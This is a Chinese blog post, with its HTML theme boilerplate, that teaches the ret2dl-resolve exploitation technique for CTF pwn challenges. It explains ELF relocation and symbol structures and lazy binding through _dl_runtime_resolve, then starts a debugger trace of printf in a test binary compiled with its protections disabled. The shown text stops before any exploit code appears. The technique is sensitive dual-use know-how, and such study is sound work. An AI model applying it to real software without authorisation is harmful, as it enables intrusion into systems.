<!DOCTYPE html>
<html lang="en">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="John Doe">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="John Doe">
    
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta name="description" content="参考链接：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;stackoverflow&#x2F;x86&#x2F;advanced-rop&#x2F;ret2dlresolve&#x2F; https:&#x2F;&#x2F;hitcxy.com&#x2F;2020&#x2F;dl-runtime-resolve&#x2F; https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;oyne1i#YrjFV  ret2dl-re">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dl-resolve">
<meta property="og:url" content="http://example.com/2022/04/29/dl-runtime-resolve/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="参考链接：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;stackoverflow&#x2F;x86&#x2F;advanced-rop&#x2F;ret2dlresolve&#x2F; https:&#x2F;&#x2F;hitcxy.com&#x2F;2020&#x2F;dl-runtime-resolve&#x2F; https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;oyne1i#YrjFV  ret2dl-re">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236487.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236489.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236490.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236491.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236492.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236493.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236494.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236495.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236496.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236498.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236499.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236500.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236501.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236502.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236503.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236504.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236505.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236506.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236507.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236508.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236509.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236510.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236511.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236512.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236513.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236514.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236515.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236516.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236517.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236518.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236519.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236520.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236521.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236522.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236523.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236524.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236525.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236526.png">
<meta property="article:published_time" content="2022-04-29T13:33:51.597Z">
<meta property="article:modified_time" content="2022-07-03T14:37:40.306Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236487.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    
    <title>ret2dl-resolve · 渐渐的博客</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 5.4.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>渐渐的博客</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">渐渐的博客</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">ret2dl-resolve</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                ret2dl-resolve
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">15k</span>Reading time: <span class="post-count reading-time">70 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2022/04/29</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <blockquote>
<p>参考链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/</a></p>
<p><a target="_blank" rel="noopener" href="https://hitcxy.com/2020/dl-runtime-resolve/">https://hitcxy.com/2020/dl-runtime-resolve/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/oyne1i#YrjFV">https://www.yuque.com/cyberangel/rg9gdm/oyne1i#YrjFV</a></p>
</blockquote>
<h3 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h3><p>ret2dlresolve是高级ROP（Return-Oriented  Programming：返回导向编程）的一种，顾名思义就是利用溢出或其他漏洞返回到“Linux动态链接库中符号解析过程”并加以利用；在解析符号真实地址的过程中有两个核心函数：<code>_dl_runtime_resolve</code>和其中的<code>_dl_fixup</code>。这种攻击方式较为麻烦和难以理解，可以作为解题时思路的最后选择（如PIE保护开启、简单的栈溢出无法泄露出更多的信息、无libc等）。</p>
<p>ret2dl-resolve 于 2015 年 在 论 文 <a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf">How the ELF Ruined Christmas</a>中被提出</p>
<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>在一个存在延迟绑定机制程序中,库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。</p>
<p>这过程中牵扯到两个重要的结构体<code>Elf_Rel</code>与<code>Elf_Sym</code>.</p>
<p>重定位项使用 Elf_Rel 结构体来描述，存在于<code>.rep.plt</code> 段和 <code>.rel.dyn</code>段中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword   r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword  r_addend;       <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<p>32位程序使用REL，而64位程序使用RELA。</p>
<p><code>r_info</code>宏定义中按照以下方式进行解析和插入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)        ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)       ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)     (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)          ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)         ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>

<p>每个符号都是一个Elf_Sym结构体的实例，这些符号又共同组成了.dynsym段。Elf_Sym结构体如下所示。其中st_name域是相对于.dynstr段的偏移，保存符号名字符串；st_value域是当符号被导出时用于存放虚拟地址的，不导出时则为NULL。 而每个符号使用<code>Elf_Sym</code>结构体来描述，存在于<code>.dynsym</code>段和<code>.symtab</code>段中，而 <code>.symtab</code> 在<code>strip</code>之后会被删掉：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>

<p>下面的宏描述了 st_info 是怎样被解析和插入的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* How to extract and insert information held in the st_info field.  */</span><br><span class="line"></span><br><span class="line">#define ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="line">#define ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span><br><span class="line">#define ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br><span class="line"></span><br><span class="line">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span><br><span class="line">#define ELF64_ST_BIND(val)      ELF32_ST_BIND (val)</span><br><span class="line">#define ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)</span><br><span class="line">#define ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))</span><br></pre></td></tr></table></figure>

<p>当一个库函数被第一次调用时，具体动态解析过程的步骤为：</p>
<p>导入函数的<code>reloc_index</code>标识(一个<code>ELF_Rel</code>在 <code>.rel.plt</code>中的偏移)入栈。</p>
<p>然后跳转到<code>.plt</code> 段的开头,即 PLT[0]。PLT[0] 处的代码将 GOT[1] 的值压入栈中，然后跳转到 GOT[2]。 GOT[1]与GOT[2]这两个 GOT 表条目有着特殊的含义。</p>
<p>​    GOT[1]：一个指向内部数据结构的指针，类型是 <code>link_map</code>，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的<code>l_info</code> 域中保存了<code>.dynamic</code> 段中大多数条目的指针构成的一个数组。</p>
<p>​    GOT[2]：一个指向动态装载器中 <code>_dl_runtime_resolve</code> 函数的指针。</p>
<p>所以这步，PLT[0] 其实就是调用<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code></p>
<p><code>_dl_runtime_resolve</code>函数使用参数<code>link_map_obj</code>来获取解析导入函数（使用<code>reloc_index</code>参数标识）需要的信息，并将结果写到正确的 GOT 条目中。在 <code>_dl_runtime_resolve</code>解析完成后，控制流就交到了那个函数手里，而下次再调用函数的 plt 时，就会直接进入目标函数中执行。过程如下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236487.png" alt="image-20220429215259397"></p>
<h3 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h3><ol>
<li>首先用<code>link_map</code>访问<code>.dynamic</code>，分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址</li>
<li><code>.rel.plt</code>+参数<code>reloc_index</code>，求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
<li><code>rel-&gt;r_info</code> &gt;&gt; <code>8</code> 作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li>
<li><code>.dynstr</code> + <code>sym-&gt;st_name</code>得出符号名 字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表</li>
<li>最后调用这个函数</li>
</ol>
<h3 id="以printf为例追踪一下ELF文件libc函数解析过程"><a href="#以printf为例追踪一下ELF文件libc函数解析过程" class="headerlink" title="以printf为例追踪一下ELF文件libc函数解析过程"></a>以<code>printf</code>为例追踪一下<code>ELF</code>文件<code>libc</code>函数解析过程</h3><p>下面使用一个简单的64位程序进行演示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;the value of a+b is:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a+b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bye bye~\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -m32 -z norelro -no-pie -z execstack -fstack-protector test.c -o test</span></span><br></pre></td></tr></table></figure>

<p><code>call printf@plt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236489.png" alt="image-20220626170241641"></p>
<p><code>si进入call printf@plt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236490.png" alt="image-20220626170426326"></p>
<p> <code>jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804978c&gt;</code>0x804978c中存储的内容为<code>0x80482e6</code>,即printf@plt+6</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236491.png" alt="image-20220626171454253"></p>
<p>然后执行push 0 和jmp 0x80482d0 即PLT[0]</p>
